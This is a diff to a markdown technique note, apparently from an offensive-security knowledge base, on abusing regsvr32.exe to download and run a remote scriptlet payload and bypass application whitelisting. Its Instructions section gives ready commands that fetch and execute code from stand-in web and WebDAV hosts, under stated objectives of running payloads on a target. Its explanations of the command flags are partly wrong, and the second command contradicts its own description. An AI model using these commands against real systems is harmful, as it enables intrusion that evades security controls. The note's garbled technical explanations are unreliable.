@@ -28,11 +28,15 @@ This technique involves using regsvr32.exe to download and execute a remote payl
 
 This technique involves using regsvr32.exe to download and execute a remote payload. Regsvr32 is a legitimate Windows utility used to register and unregister DLL files. This technique abuses the /u flag, which unregisters a DLL, to execute a remote payload. The remote payload is specified in a .sct file, which is a legitimate Windows Scriptlet file used for HTML Applications (HTAs). The .sct file is hosted remotely and downloaded by regsvr32.exe when it is executed with the /u flag. Once downloaded, the .sct file is executed, resulting in the execution of the remote payload. This technique can be used to bypass application whitelisting and other security controls.
 
+ 
+
 ## Requirements
 
 1. Authenticated access to a Windows system
 
 1. Ability to execute regsvr32.exe
+
+ 
 
 ## Defense
 
@@ -42,11 +46,15 @@ This technique involves using regsvr32.exe to download and execute a remote payl
 
 1. Use network segmentation to limit access to remote payloads
 
+ 
+
 ## Objectives
 
 1. Download and execute a remote payload on a target system
 
 1. Bypass application whitelisting and other security controls
+
+ 
 
 # Instructions
 
@@ -55,13 +63,25 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 
 Replace 'http://webserver/payload.sct' with the URL of the script you want to execute on the target system. Replace 'scrobj.dll' with the name of the DLL file you want to unregister.
 
+ 
+
+
+
 **Code**: [[regsvr32 /u /n /s /i:http://webserver/payload.sct ]]
+
+
 
 > This command unregisters a DLL file on a Windows system. The '/u' option specifies that the DLL file should be unregistered. The '/n' option specifies that no DllRegisterServer or DllUnregisterServer messages should be displayed. The '/s' option specifies that the command should be run silently without displaying any messages. The '/i' option specifies that the DLL file should be unregistered using a script located at the specified URL.
 
 2. To unregister scrobj.dll with payload.sct, run the following command:
 
+ 
+
+
+
 **Code**: [[regsvr32 /u /n /s /i:\\webdavserver\folder\payload]]
+
+
 
 > This command unregisters the scrobj.dll file with the payload.sct script. The /u flag unregisters the specified DLL file, /n specifies to not display any messages during the process, /s specifies to run the command silently, and /i specifies to pass an optional command-line parameter to the DLL file being registered or unregistered. The argument \\webdavserver\folder\payload.sct specifies the path to the payload.sct file that will be used in conjunction with the scrobj.dll file.
 
@@ -80,3 +100,5 @@ Replace 'http://webserver/payload.sct' with the URL of the script you want to ex
 
 - [[Regsvr32 @subTee]]
 - [[Windows - Download and execute methods]]
+
+
